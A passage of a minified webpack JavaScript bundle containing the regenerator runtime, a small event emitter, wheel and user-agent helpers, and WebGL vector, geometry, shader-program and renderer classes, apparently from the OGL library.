				return o.type = t, o.arg = e, s ? (this.method = "next", this.next = s.finallyLoc, l) : this.complete(o)
			},
			complete: function(t, e) {
				if ("throw" === t.type) throw t.arg;
				return "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? (this.rval = this.arg = t.arg, this.method = "return", this.next = "end") : "normal" === t.type && e && (this.next = e), l
			},
			finish: function(t) {
				for (var e = this.tryEntries.length - 1; e >= 0; --e) {
					var i = this.tryEntries[e];
					if (i.finallyLoc === t) return this.complete(i.completion, i.afterLoc), w(i), l
				}
			},
			catch: function(t) {
				for (var e = this.tryEntries.length - 1; e >= 0; --e) {
					var i = this.tryEntries[e];
					if (i.tryLoc === t) {
						var n = i.completion;
						if ("throw" === n.type) {
							var r = n.arg;
							w(i)
						}
						return r
					}
				}
				throw new Error("illegal catch attempt")
			},
			delegateYield: function(t, e, i) {
				return this.delegate = {
					iterator: b(t),
					resultName: e,
					nextLoc: i
				}, "next" === this.method && (this.arg = void 0), l
			}
		}, t
	}(t.exports);
	try {
		regeneratorRuntime = n
	} catch (t) {
		"object" == typeof globalThis ? globalThis.regeneratorRuntime = n : Function("r", "regeneratorRuntime = r")(n)
	}
}, function(t, e) {
	function i() {}
	i.prototype = {
		on: function(t, e, i) {
			var n = this.e || (this.e = {});
			return (n[t] || (n[t] = [])).push({
				fn: e,
				ctx: i
			}), this
		},
		once: function(t, e, i) {
			var n = this;

			function r() {
				n.off(t, r), e.apply(i, arguments)
			}
			return r._ = e, this.on(t, r, i)
		},
		emit: function(t) {
			for (var e = [].slice.call(arguments, 1), i = ((this.e || (this.e = {}))[t] || []).slice(), n = 0, r = i.length; n < r; n++) i[n].fn.apply(i[n].ctx, e);
			return this
		},
		off: function(t, e) {
			var i = this.e || (this.e = {}),
				n = i[t],
				r = [];
			if (n && e)
				for (var s = 0, o = n.length; s < o; s++) n[s].fn !== e && n[s].fn._ !== e && r.push(n[s]);
			return r.length ? i[t] = r : delete i[t], this
		}
	}, t.exports = i, t.exports.TinyEmitter = i
}, function(t, e, i) {
	"use strict";
	var n = i(28),
		r = i(29);

	function s(t) {
		var e = 0,
			i = 0,
			n = 0,
			r = 0;
		return "detail" in t && (i = t.detail), "wheelDelta" in t && (i = -t.wheelDelta / 120), "wheelDeltaY" in t && (i = -t.wheelDeltaY / 120), "wheelDeltaX" in t && (e = -t.wheelDeltaX / 120), "axis" in t && t.axis === t.HORIZONTAL_AXIS && (e = i, i = 0), n = 10 * e, r = 10 * i, "deltaY" in t && (r = t.deltaY), "deltaX" in t && (n = t.deltaX), (n || r) && t.deltaMode && (1 == t.deltaMode ? (n *= 40, r *= 40) : (n *= 800, r *= 800)), n && !e && (e = n < 1 ? -1 : 1), r && !i && (i = r < 1 ? -1 : 1), {
			spinX: e,
			spinY: i,
			pixelX: n,
			pixelY: r
		}
	}
	s.getEventType = function() {
		return n.firefox() ? "DOMMouseScroll" : r("wheel") ? "wheel" : "mousewheel"
	}, t.exports = s
}, function(t, e) {
	var i, n, r, s, o, a, u, h, l, c, d, p, f, m, g, v = !1;

	function _() {
		if (!v) {
			v = !0;
			var t = navigator.userAgent,
				e = /(?:MSIE.(\d+\.\d+))|(?:(?:Firefox|GranParadiso|Iceweasel).(\d+\.\d+))|(?:Opera(?:.+Version.|.)(\d+\.\d+))|(?:AppleWebKit.(\d+(?:\.\d+)?))|(?:Trident\/\d+\.\d+.*rv:(\d+\.\d+))/.exec(t),
				_ = /(Mac OS X)|(Windows)|(Linux)/.exec(t);
			if (p = /\b(iPhone|iP[ao]d)/.exec(t), f = /\b(iP[ao]d)/.exec(t), c = /Android/i.exec(t), m = /FBAN\/\w+;/i.exec(t), g = /Mobile/i.exec(t), d = !!/Win64/.exec(t), e) {
				(i = e[1] ? parseFloat(e[1]) : e[5] ? parseFloat(e[5]) : NaN) && document && document.documentMode && (i = document.documentMode);
				var D = /(?:Trident\/(\d+.\d+))/.exec(t);
				a = D ? parseFloat(D[1]) + 4 : i, n = e[2] ? parseFloat(e[2]) : NaN, r = e[3] ? parseFloat(e[3]) : NaN, (s = e[4] ? parseFloat(e[4]) : NaN) ? (e = /(?:Chrome\/(\d+\.\d+))/.exec(t), o = e && e[1] ? parseFloat(e[1]) : NaN) : o = NaN
			} else i = n = r = o = s = NaN;
			if (_) {
				if (_[1]) {
					var y = /(?:Mac OS X (\d+(?:[._]\d+)?))/.exec(t);
					u = !y || parseFloat(y[1].replace("_", "."))
				} else u = !1;
				h = !!_[2], l = !!_[3]
			} else u = h = l = !1
		}
	}
	var D = {
		ie: function() {
			return _() || i
		},
		ieCompatibilityMode: function() {
			return _() || a > i
		},
		ie64: function() {
			return D.ie() && d
		},
		firefox: function() {
			return _() || n
		},
		opera: function() {
			return _() || r
		},
		webkit: function() {
			return _() || s
		},
		safari: function() {
			return D.webkit()
		},
		chrome: function() {
			return _() || o
		},
		windows: function() {
			return _() || h
		},
		osx: function() {
			return _() || u
		},
		linux: function() {
			return _() || l
		},
		iphone: function() {
			return _() || p
		},
		mobile: function() {
			return _() || p || f || c || g
		},
		nativeApp: function() {
			return _() || m
		},
		android: function() {
			return _() || c
		},
		ipad: function() {
			return _() || f
		}
	};
	t.exports = D
}, function(t, e, i) {
	"use strict";
	var n, r = i(30);
	r.canUseDOM && (n = document.implementation && document.implementation.hasFeature && !0 !== document.implementation.hasFeature("", "")), t.exports = function(t, e) {
		if (!r.canUseDOM || e && !("addEventListener" in document)) return !1;
		var i = "on" + t,
			s = i in document;
		if (!s) {
			var o = document.createElement("div");
			o.setAttribute(i, "return;"), s = "function" == typeof o[i]
		}
		return !s && n && "wheel" === t && (s = document.implementation.hasFeature("Events.wheel", "3.0")), s
	}
}, function(t, e, i) {
	"use strict";
	var n = !("undefined" == typeof window || !window.document || !window.document.createElement),
		r = {
			canUseDOM: n,
			canUseWorkers: "undefined" != typeof Worker,
			canUseEventListeners: n && !(!window.addEventListener && !window.attachEvent),
			canUseViewport: n && !!window.screen,
			isInWorker: !n
		};
	t.exports = r
}, function(t, e, i) {
	"use strict";
	i.r(e), i(19), i(21);
	var n = i(0),
		r = i.n(n),
		s = i(1),
		o = i.n(s),
		a = i(5),
		u = i.n(a),
		h = i(12),
		l = i.n(h),
		c = i(3),
		d = i.n(c),
		p = i(4),
		f = i.n(p),
		m = i(2),
		g = i.n(m),
		v = i(13),
		_ = i.n(v),
		D = i(9),
		y = i.n(D);

	function x(t) {
		let e = t[0],
			i = t[1],
			n = t[2];
		return Math.sqrt(e * e + i * i + n * n)
	}

	function w(t, e) {
		return t[0] = e[0], t[1] = e[1], t[2] = e[2], t
	}

	function E(t, e, i) {
		return t[0] = e[0] + i[0], t[1] = e[1] + i[1], t[2] = e[2] + i[2], t
	}

	function b(t, e, i) {
		return t[0] = e[0] - i[0], t[1] = e[1] - i[1], t[2] = e[2] - i[2], t
	}

	function C(t, e, i) {
		return t[0] = e[0] * i, t[1] = e[1] * i, t[2] = e[2] * i, t
	}

	function T(t) {
		let e = t[0],
			i = t[1],
			n = t[2];
		return e * e + i * i + n * n
	}

	function F(t, e) {
		let i = e[0],
			n = e[1],
			r = e[2],
			s = i * i + n * n + r * r;
		return s > 0 && (s = 1 / Math.sqrt(s)), t[0] = e[0] * s, t[1] = e[1] * s, t[2] = e[2] * s, t
	}

	function M(t, e) {
		return t[0] * e[0] + t[1] * e[1] + t[2] * e[2]
	}

	function A(t, e, i) {
		let n = e[0],
			r = e[1],
			s = e[2],
			o = i[0],
			a = i[1],
			u = i[2];
		return t[0] = r * u - s * a, t[1] = s * o - n * u, t[2] = n * a - r * o, t
	}
	const S = function() {
		const t = [0, 0, 0],
			e = [0, 0, 0];
		return function(i, n) {
			w(t, i), w(e, n), F(t, t), F(e, e);
			let r = M(t, e);
			return r > 1 ? 0 : r < -1 ? Math.PI : Math.acos(r)
		}
	}();
	class O extends Array {
		constructor(t = 0, e = t, i = t) {
			return super(t, e, i), this
		}
		get x() {
			return this[0]
		}
		get y() {
			return this[1]
		}
		get z() {
			return this[2]
		}
		set x(t) {
			this[0] = t
		}
		set y(t) {
			this[1] = t
		}
		set z(t) {
			this[2] = t
		}
		set(t, e = t, i = t) {
			return t.length ? this.copy(t) : (function(t, e, i, n) {
				t[0] = e, t[1] = i, t[2] = n
			}(this, t, e, i), this)
		}
		copy(t) {
			return w(this, t), this
		}
		add(t, e) {
			return e ? E(this, t, e) : E(this, this, t), this
		}
		sub(t, e) {
			return e ? b(this, t, e) : b(this, this, t), this
		}
		multiply(t) {
			var e, i, n;
			return t.length ? (i = this, n = t, (e = this)[0] = i[0] * n[0], e[1] = i[1] * n[1], e[2] = i[2] * n[2]) : C(this, this, t), this
		}
		divide(t) {
			var e, i, n;
			return t.length ? (i = this, n = t, (e = this)[0] = i[0] / n[0], e[1] = i[1] / n[1], e[2] = i[2] / n[2]) : C(this, this, 1 / t), this
		}
		inverse(t = this) {
			var e, i;
			return i = t, (e = this)[0] = 1 / i[0], e[1] = 1 / i[1], e[2] = 1 / i[2], this
		}
		len() {
			return x(this)
		}
		distance(t) {
			return t ? function(t, e) {
				let i = e[0] - t[0],
					n = e[1] - t[1],
					r = e[2] - t[2];
				return Math.sqrt(i * i + n * n + r * r)
			}(this, t) : x(this)
		}
		squaredLen() {
			return T(this)
		}
		squaredDistance(t) {
			return t ? function(t, e) {
				let i = e[0] - t[0],
					n = e[1] - t[1],
					r = e[2] - t[2];
				return i * i + n * n + r * r
			}(this, t) : T(this)
		}
		negate(t = this) {
			var e, i;
			return i = t, (e = this)[0] = -i[0], e[1] = -i[1], e[2] = -i[2], this
		}
		cross(t, e) {
			return e ? A(this, t, e) : A(this, this, t), this
		}
		scale(t) {
			return C(this, this, t), this
		}
		normalize() {
			return F(this, this), this
		}
		dot(t) {
			return M(this, t)
		}
		equals(t) {
			return e = t, this[0] === e[0] && this[1] === e[1] && this[2] === e[2];
			var e
		}
		applyMatrix3(t) {
			return function(t, e, i) {
				let n = e[0],
					r = e[1],
					s = e[2];
				t[0] = n * i[0] + r * i[3] + s * i[6], t[1] = n * i[1] + r * i[4] + s * i[7], t[2] = n * i[2] + r * i[5] + s * i[8]
			}(this, this, t), this
		}
		applyMatrix4(t) {
			return function(t, e, i) {
				let n = e[0],
					r = e[1],
					s = e[2],
					o = i[3] * n + i[7] * r + i[11] * s + i[15];
				o = o || 1, t[0] = (i[0] * n + i[4] * r + i[8] * s + i[12]) / o, t[1] = (i[1] * n + i[5] * r + i[9] * s + i[13]) / o, t[2] = (i[2] * n + i[6] * r + i[10] * s + i[14]) / o
			}(this, this, t), this
		}
		scaleRotateMatrix4(t) {
			return function(t, e, i) {
				let n = e[0],
					r = e[1],
					s = e[2],
					o = i[3] * n + i[7] * r + i[11] * s + i[15];
				o = o || 1, t[0] = (i[0] * n + i[4] * r + i[8] * s) / o, t[1] = (i[1] * n + i[5] * r + i[9] * s) / o, t[2] = (i[2] * n + i[6] * r + i[10] * s) / o
			}(this, this, t), this
		}
		applyQuaternion(t) {
			return function(t, e, i) {
				let n = e[0],
					r = e[1],
					s = e[2],
					o = i[0],
					a = i[1],
					u = i[2],
					h = a * s - u * r,
					l = u * n - o * s,
					c = o * r - a * n,
					d = a * c - u * l,
					p = u * h - o * c,
					f = o * l - a * h,
					m = 2 * i[3];
				h *= m, l *= m, c *= m, d *= 2, p *= 2, f *= 2, t[0] = n + h + d, t[1] = r + l + p, t[2] = s + c + f
			}(this, this, t), this
		}
		angle(t) {
			return S(this, t)
		}
		lerp(t, e) {
			return function(t, e, i, n) {
				let r = e[0],
					s = e[1],
					o = e[2];
				t[0] = r + n * (i[0] - r), t[1] = s + n * (i[1] - s), t[2] = o + n * (i[2] - o)
			}(this, this, t, e), this
		}
		clone() {
			return new O(this[0], this[1], this[2])
		}
		fromArray(t, e = 0) {
			return this[0] = t[e], this[1] = t[e + 1], this[2] = t[e + 2], this
		}
		toArray(t = [], e = 0) {
			return t[e] = this[0], t[e + 1] = this[1], t[e + 2] = this[2], t
		}
		transformDirection(t) {
			const e = this[0],
				i = this[1],
				n = this[2];
			return this[0] = t[0] * e + t[4] * i + t[8] * n, this[1] = t[1] * e + t[5] * i + t[9] * n, this[2] = t[2] * e + t[6] * i + t[10] * n, this.normalize()
		}
	}
	const P = new O;
	let I = 1,
		L = 1,
		B = !1;
	class k {
		constructor(t, e = {}) {
			t.canvas || console.error("gl not passed as first argument to Geometry"), this.gl = t, this.attributes = e, this.id = I++, this.VAOs = {}, this.drawRange = {
				start: 0,
				count: 0
			}, this.instancedCount = 0, this.gl.renderer.bindVertexArray(null), this.gl.renderer.currentGeometry = null, this.glState = this.gl.renderer.state;
			for (let t in e) this.addAttribute(t, e[t])
		}
		addAttribute(t, e) {
			if (this.attributes[t] = e, e.id = L++, e.size = e.size || 1, e.type = e.type || (e.data.constructor === Float32Array ? this.gl.FLOAT : e.data.constructor === Uint16Array ? this.gl.UNSIGNED_SHORT : this.gl.UNSIGNED_INT), e.target = "index" === t ? this.gl.ELEMENT_ARRAY_BUFFER : this.gl.ARRAY_BUFFER, e.normalized = e.normalized || !1, e.stride = e.stride || 0, e.offset = e.offset || 0, e.count = e.count || (e.stride ? e.data.byteLength / e.stride : e.data.length / e.size), e.divisor = e.instanced || 0, e.needsUpdate = !1, e.usage = e.usage || this.gl.STATIC_DRAW, e.buffer || this.updateAttribute(e), e.divisor) {
				if (this.isInstanced = !0, this.instancedCount && this.instancedCount !== e.count * e.divisor) return console.warn("geometry has multiple instanced buffers of different length"), this.instancedCount = Math.min(this.instancedCount, e.count * e.divisor);
				this.instancedCount = e.count * e.divisor
			} else "index" === t ? this.drawRange.count = e.count : this.attributes.index || (this.drawRange.count = Math.max(this.drawRange.count, e.count))
		}
		updateAttribute(t) {
			const e = !t.buffer;
			e && (t.buffer = this.gl.createBuffer()), this.glState.boundBuffer !== t.buffer && (this.gl.bindBuffer(t.target, t.buffer), this.glState.boundBuffer = t.buffer), e ? this.gl.bufferData(t.target, t.data, t.usage) : this.gl.bufferSubData(t.target, 0, t.data), t.needsUpdate = !1
		}
		setIndex(t) {
			this.addAttribute("index", t)
		}
		setDrawRange(t, e) {
			this.drawRange.start = t, this.drawRange.count = e
		}
		setInstancedCount(t) {
			this.instancedCount = t
		}
		createVAO(t) {
			this.VAOs[t.attributeOrder] = this.gl.renderer.createVertexArray(), this.gl.renderer.bindVertexArray(this.VAOs[t.attributeOrder]), this.bindAttributes(t)
		}
		bindAttributes(t) {
			t.attributeLocations.forEach(((t, {
				name: e,
				type: i
			}) => {
				if (!this.attributes[e]) return void console.warn(`active attribute ${e} not being supplied`);
				const n = this.attributes[e];
				this.gl.bindBuffer(n.target, n.buffer), this.glState.boundBuffer = n.buffer;
				let r = 1;
				35674 === i && (r = 2), 35675 === i && (r = 3), 35676 === i && (r = 4);
				const s = n.size / r,
					o = 1 === r ? 0 : r * r * r,
					a = 1 === r ? 0 : r * r;
				for (let e = 0; e < r; e++) this.gl.vertexAttribPointer(t + e, s, n.type, n.normalized, n.stride + o, n.offset + e * a), this.gl.enableVertexAttribArray(t + e), this.gl.renderer.vertexAttribDivisor(t + e, n.divisor)
			})), this.attributes.index && this.gl.bindBuffer(this.gl.ELEMENT_ARRAY_BUFFER, this.attributes.index.buffer)
		}
		draw({
			program: t,
			mode: e = this.gl.TRIANGLES
		}) {
			this.gl.renderer.currentGeometry !== `${this.id}_${t.attributeOrder}` && (this.VAOs[t.attributeOrder] || this.createVAO(t), this.gl.renderer.bindVertexArray(this.VAOs[t.attributeOrder]), this.gl.renderer.currentGeometry = `${this.id}_${t.attributeOrder}`), t.attributeLocations.forEach(((t, {
				name: e
			}) => {
				const i = this.attributes[e];
				i.needsUpdate && this.updateAttribute(i)
			})), this.isInstanced ? this.attributes.index ? this.gl.renderer.drawElementsInstanced(e, this.drawRange.count, this.attributes.index.type, this.attributes.index.offset + 2 * this.drawRange.start, this.instancedCount) : this.gl.renderer.drawArraysInstanced(e, this.drawRange.start, this.drawRange.count, this.instancedCount) : this.attributes.index ? this.gl.drawElements(e, this.drawRange.count, this.attributes.index.type, this.attributes.index.offset + 2 * this.drawRange.start) : this.gl.drawArrays(e, this.drawRange.start, this.drawRange.count)
		}
		getPosition() {
			const t = this.attributes.position;
			return t.data ? t : B ? void 0 : (console.warn("No position buffer data found to compute bounds"), B = !0)
		}
		computeBoundingBox(t) {
			t || (t = this.getPosition());
			const e = t.data,
				i = t.stride ? t.stride / e.BYTES_PER_ELEMENT : t.size;
			this.bounds || (this.bounds = {
				min: new O,
				max: new O,
				center: new O,
				scale: new O,
				radius: 1 / 0
			});
			const n = this.bounds.min,
				r = this.bounds.max,
				s = this.bounds.center,
				o = this.bounds.scale;
			n.set(1 / 0), r.set(-1 / 0);
			for (let t = 0, s = e.length; t < s; t += i) {
				const i = e[t],
					s = e[t + 1],
					o = e[t + 2];
				n.x = Math.min(i, n.x), n.y = Math.min(s, n.y), n.z = Math.min(o, n.z), r.x = Math.max(i, r.x), r.y = Math.max(s, r.y), r.z = Math.max(o, r.z)
			}
			o.sub(r, n), s.add(n, r).divide(2)
		}
		computeBoundingSphere(t) {
			t || (t = this.getPosition());
			const e = t.data,
				i = t.stride ? t.stride / e.BYTES_PER_ELEMENT : t.size;
			this.bounds || this.computeBoundingBox(t);
			let n = 0;
			for (let t = 0, r = e.length; t < r; t += i) P.fromArray(e, t), n = Math.max(n, this.bounds.center.squaredDistance(P));
			this.bounds.radius = Math.sqrt(n)
		}
		remove() {
			for (let t in this.VAOs) this.gl.renderer.deleteVertexArray(this.VAOs[t]), delete this.VAOs[t];
			for (let t in this.attributes) this.gl.deleteBuffer(this.attributes[t].buffer), delete this.attributes[t]
		}
	}
	let R = 1;
	const N = {};
	class W {
		constructor(t, {
			vertex: e,
			fragment: i,
			uniforms: n = {},
			transparent: r = !1,
			cullFace: s = t.BACK,
			frontFace: o = t.CCW,
			depthTest: a = !0,
			depthWrite: u = !0,
			depthFunc: h = t.LESS
		} = {}) {
			t.canvas || console.error("gl not passed as fist argument to Program"), this.gl = t, this.uniforms = n, this.id = R++, e || console.warn("vertex shader not supplied"), i || console.warn("fragment shader not supplied"), this.transparent = r, this.cullFace = s, this.frontFace = o, this.depthTest = a, this.depthWrite = u, this.depthFunc = h, this.blendFunc = {}, this.blendEquation = {}, this.transparent && !this.blendFunc.src && (this.gl.renderer.premultipliedAlpha ? this.setBlendFunc(this.gl.ONE, this.gl.ONE_MINUS_SRC_ALPHA) : this.setBlendFunc(this.gl.SRC_ALPHA, this.gl.ONE_MINUS_SRC_ALPHA));
			const l = t.createShader(t.VERTEX_SHADER);
			t.shaderSource(l, e), t.compileShader(l), "" !== t.getShaderInfoLog(l) && console.warn(`${t.getShaderInfoLog(l)}\nVertex Shader\n${U(e)}`);
			const c = t.createShader(t.FRAGMENT_SHADER);
			if (t.shaderSource(c, i), t.compileShader(c), "" !== t.getShaderInfoLog(c) && console.warn(`${t.getShaderInfoLog(c)}\nFragment Shader\n${U(i)}`), this.program = t.createProgram(), t.attachShader(this.program, l), t.attachShader(this.program, c), t.linkProgram(this.program), !t.getProgramParameter(this.program, t.LINK_STATUS)) return console.warn(t.getProgramInfoLog(this.program));
			t.deleteShader(l), t.deleteShader(c), this.uniformLocations = new Map;
			let d = t.getProgramParameter(this.program, t.ACTIVE_UNIFORMS);
			for (let e = 0; e < d; e++) {
				let i = t.getActiveUniform(this.program, e);
				this.uniformLocations.set(i, t.getUniformLocation(this.program, i.name));
				const n = i.name.match(/(\w+)/g);
				i.uniformName = n[0], 3 === n.length ? (i.isStructArray = !0, i.structIndex = Number(n[1]), i.structProperty = n[2]) : 2 === n.length && isNaN(Number(n[1])) && (i.isStruct = !0, i.structProperty = n[1])
			}
			this.attributeLocations = new Map;
			const p = [],
				f = t.getProgramParameter(this.program, t.ACTIVE_ATTRIBUTES);
			for (let e = 0; e < f; e++) {
				const i = t.getActiveAttrib(this.program, e),
					n = t.getAttribLocation(this.program, i.name);
				p[n] = i.name, this.attributeLocations.set(i, n)
			}
			this.attributeOrder = p.join("")
		}
		setBlendFunc(t, e, i, n) {
			this.blendFunc.src = t, this.blendFunc.dst = e, this.blendFunc.srcAlpha = i, this.blendFunc.dstAlpha = n, t && (this.transparent = !0)
		}
		setBlendEquation(t, e) {
			this.blendEquation.modeRGB = t, this.blendEquation.modeAlpha = e
		}
		applyState() {
			this.depthTest ? this.gl.renderer.enable(this.gl.DEPTH_TEST) : this.gl.renderer.disable(this.gl.DEPTH_TEST), this.cullFace ? this.gl.renderer.enable(this.gl.CULL_FACE) : this.gl.renderer.disable(this.gl.CULL_FACE), this.blendFunc.src ? this.gl.renderer.enable(this.gl.BLEND) : this.gl.renderer.disable(this.gl.BLEND), this.cullFace && this.gl.renderer.setCullFace(this.cullFace), this.gl.renderer.setFrontFace(this.frontFace), this.gl.renderer.setDepthMask(this.depthWrite), this.gl.renderer.setDepthFunc(this.depthFunc), this.blendFunc.src && this.gl.renderer.setBlendFunc(this.blendFunc.src, this.blendFunc.dst, this.blendFunc.srcAlpha, this.blendFunc.dstAlpha), this.gl.renderer.setBlendEquation(this.blendEquation.modeRGB, this.blendEquation.modeAlpha)
		}
		use({
			flipFaces: t = !1
		} = {}) {
			let e = -1;
			this.gl.renderer.currentProgram === this.id || (this.gl.useProgram(this.program), this.gl.renderer.currentProgram = this.id), this.uniformLocations.forEach(((t, i) => {
				let n = i.uniformName,
					r = this.uniforms[n];
				if (i.isStruct && (r = r[i.structProperty], n += "." + i.structProperty), i.isStructArray && (r = r[i.structIndex][i.structProperty], n += `[${i.structIndex}].${i.structProperty}`), !r) return V(`Active uniform ${n} has not been supplied`);
				if (r && void 0 === r.value) return V(n + " uniform is missing a value parameter");
				if (r.value.texture) return e += 1, r.value.update(e), z(this.gl, i.type, t, e);
				if (r.value.length && r.value[0].texture) {
					const n = [];
					return r.value.forEach((t => {
						e += 1, t.update(e), n.push(e)
					})), z(this.gl, i.type, t, n)
				}
				z(this.gl, i.type, t, r.value)
			})), this.applyState(), t && this.gl.renderer.setFrontFace(this.frontFace === this.gl.CCW ? this.gl.CW : this.gl.CCW)
		}
		remove() {
			this.gl.deleteProgram(this.program)
		}
	}

	function z(t, e, i, n) {
		n = n.length ? function(t) {
			const e = t.length,
				i = t[0].length;
			if (void 0 === i) return t;
			const n = e * i;
			let r = N[n];
			r || (N[n] = r = new Float32Array(n));
			for (let n = 0; n < e; n++) r.set(t[n], n * i);
			return r
		}(n) : n;
		const r = t.renderer.state.uniformLocations.get(i);
		if (n.length)
			if (void 0 === r || r.length !== n.length) t.renderer.state.uniformLocations.set(i, n.slice(0));
			else {
				if (function(t, e) {
						if (t.length !== e.length) return !1;
						for (let i = 0, n = t.length; i < n; i++)
							if (t[i] !== e[i]) return !1;
						return !0
					}(r, n)) return;
				r.set ? r.set(n) : function(t, e) {
					for (let i = 0, n = t.length; i < n; i++) t[i] = e[i]
				}(r, n), t.renderer.state.uniformLocations.set(i, r)
			}
		else {
			if (r === n) return;
			t.renderer.state.uniformLocations.set(i, n)
		}
		switch (e) {
			case 5126:
				return n.length ? t.uniform1fv(i, n) : t.uniform1f(i, n);
			case 35664:
				return t.uniform2fv(i, n);
			case 35665:
				return t.uniform3fv(i, n);
			case 35666:
				return t.uniform4fv(i, n);
			case 35670:
			case 5124:
			case 35678:
			case 35680:
				return n.length ? t.uniform1iv(i, n) : t.uniform1i(i, n);
			case 35671:
			case 35667:
				return t.uniform2iv(i, n);
			case 35672:
			case 35668:
				return t.uniform3iv(i, n);
			case 35673:
			case 35669:
				return t.uniform4iv(i, n);
			case 35674:
				return t.uniformMatrix2fv(i, !1, n);
			case 35675:
				return t.uniformMatrix3fv(i, !1, n);
			case 35676:
				return t.uniformMatrix4fv(i, !1, n)
		}
	}

	function U(t) {
		let e = t.split("\n");
		for (let t = 0; t < e.length; t++) e[t] = t + 1 + ": " + e[t];
		return e.join("\n")
	}
	let j = 0;

	function V(t) {
		j > 100 || (console.warn(t), j++, j > 100 && console.warn("More than 100 program warnings - stopping logs."))
	}
	const G = new O;
	let H = 1;
	class q {
		constructor({
			canvas: t = document.createElement("canvas"),
			width: e = 300,
			height: i = 150,
			dpr: n = 1,
			alpha: r = !1,
			depth: s = !0,
			stencil: o = !1,
			antialias: a = !1,
			premultipliedAlpha: u = !1,
			preserveDrawingBuffer: h = !1,
			powerPreference: l = "default",
			autoClear: c = !0,
			webgl: d = 2
		} = {}) {
			const p = {
				alpha: r,
				depth: s,
				stencil: o,
				antialias: a,
				premultipliedAlpha: u,
				preserveDrawingBuffer: h,
				powerPreference: l
			};
			this.dpr = n, this.alpha = r, this.color = !0, this.depth = s, this.stencil = o, this.premultipliedAlpha = u, this.autoClear = c, this.id = H++, 2 === d && (this.gl = t.getContext("webgl2", p)), this.isWebgl2 = !!this.gl, this.gl || (this.gl = t.getContext("webgl", p)), this.gl || console.error("unable to create webgl context"), this.gl.renderer = this, this.setSize(e, i), this.state = {}, this.state.blendFunc = {
				src: this.gl.ONE,
				dst: this.gl.ZERO
			}, this.state.blendEquation = {
				modeRGB: this.gl.FUNC_ADD
			}, this.state.cullFace = null, this.state.frontFace = this.gl.CCW, this.state.depthMask = !0, this.state.depthFunc = this.gl.LESS, this.state.premultiplyAlpha = !1, this.state.flipY = !1, this.state.unpackAlignment = 4, this.state.framebuffer = null, this.state.viewport = {
				x: 0,
				y: 0,
				width: null,
				height: null
			}, this.state.textureUnits = [], this.state.activeTextureUnit = 0, this.state.boundBuffer = null, this.state.uniformLocations = new Map, this.extensions = {}, this.isWebgl2 ? (this.getExtension("EXT_color_buffer_float"), this.getExtension("OES_texture_float_linear")) : (this.getExtension("OES_texture_float"), this.getExtension("OES_texture_float_linear"), this.getExtension("OES_texture_half_float"), this.getExtension("OES_texture_half_float_linear"), this.getExtension("OES_element_index_uint"), this.getExtension("OES_standard_derivatives"), this.getExtension("EXT_sRGB"), this.getExtension("WEBGL_depth_texture"), this.getExtension("WEBGL_draw_buffers")), this.getExtension("WEBGL_compressed_texture_astc"), this.getExtension("EXT_texture_compression_bptc"), this.getExtension("WEBGL_compressed_texture_s3tc"), this.getExtension("WEBGL_compressed_texture_etc1"), this.getExtension("WEBGL_compressed_texture_pvrtc"), this.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc"), this.vertexAttribDivisor = this.getExtension("ANGLE_instanced_arrays", "vertexAttribDivisor", "vertexAttribDivisorANGLE"), this.drawArraysInstanced = this.getExtension("ANGLE_instanced_arrays", "drawArraysInstanced", "drawArraysInstancedANGLE"), this.drawElementsInstanced = this.getExtension("ANGLE_instanced_arrays", "drawElementsInstanced", "drawElementsInstancedANGLE"), this.createVertexArray = this.getExtension("OES_vertex_array_object", "createVertexArray", "createVertexArrayOES"), this.bindVertexArray = this.getExtension("OES_vertex_array_object", "bindVertexArray", "bindVertexArrayOES"), this.deleteVertexArray = this.getExtension("OES_vertex_array_object", "deleteVertexArray", "deleteVertexArrayOES"), this.drawBuffers = this.getExtension("WEBGL_draw_buffers", "drawBuffers", "drawBuffersWEBGL"), this.parameters = {}, this.parameters.maxTextureUnits = this.gl.getParameter(this.gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS), this.parameters.maxAnisotropy = this.getExtension("EXT_texture_filter_anisotropic") ? this.gl.getParameter(this.getExtension("EXT_texture_filter_anisotropic").MAX_TEXTURE_MAX_ANISOTROPY_EXT) : 0
		}
		setSize(t, e) {
			this.width = t, this.height = e, this.gl.canvas.width = t * this.dpr, this.gl.canvas.height = e * this.dpr, Object.assign(this.gl.canvas.style, {
				width: t + "px",
				height: e + "px"
			})
		}
		setViewport(t, e, i = 0, n = 0) {
			this.state.viewport.width === t && this.state.viewport.height === e || (this.state.viewport.width = t, this.state.viewport.height = e, this.state.viewport.x = i, this.state.viewport.y = n, this.gl.viewport(i, n, t, e))
		}
		setScissor(t, e, i = 0, n = 0) {
			this.gl.scissor(i, n, t, e)
		}
		enable(t) {
			!0 !== this.state[t] && (this.gl.enable(t), this.state[t] = !0)
		}
		disable(t) {
			!1 !== this.state[t] && (this.gl.disable(t), this.state[t] = !1)
		}
		setBlendFunc(t, e, i, n) {
			this.state.blendFunc.src === t && this.state.blendFunc.dst === e && this.state.blendFunc.srcAlpha === i && this.state.blendFunc.dstAlpha === n || (this.state.blendFunc.src = t, this.state.blendFunc.dst = e, this.state.blendFunc.srcAlpha = i, this.state.blendFunc.dstAlpha = n, void 0 !== i ? this.gl.blendFuncSeparate(t, e, i, n) : this.gl.blendFunc(t, e))
		}
		setBlendEquation(t, e) {
			t = t || this.gl.FUNC_ADD, this.state.blendEquation.modeRGB === t && this.state.blendEquation.modeAlpha === e || (this.state.blendEquation.modeRGB = t, this.state.blendEquation.modeAlpha = e, void 0 !== e ? this.gl.blendEquationSeparate(t, e) : this.gl.blendEquation(t))
		}
		setCullFace(t) {
			this.state.cullFace !== t && (this.state.cullFace = t, this.gl.cullFace(t))
		}
		setFrontFace(t) {
			this.state.frontFace !== t && (this.state.frontFace = t, this.gl.frontFace(t))
		}
		setDepthMask(t) {
			this.state.depthMask !== t && (this.state.depthMask = t, this.gl.depthMask(t))
		}
		setDepthFunc(t) {
			this.state.depthFunc !== t && (this.state.depthFunc = t, this.gl.depthFunc(t))
		}
		activeTexture(t) {
			this.state.activeTextureUnit !== t && (this.state.activeTextureUnit = t, this.gl.activeTexture(this.gl.TEXTURE0 + t))
		}
		bindFramebuffer({
			target: t = this.gl.FRAMEBUFFER,
			buffer: e = null
		} = {}) {
			this.state.framebuffer !== e && (this.state.framebuffer = e, this.gl.bindFramebuffer(t, e))
		}
		getExtension(t, e, i) {
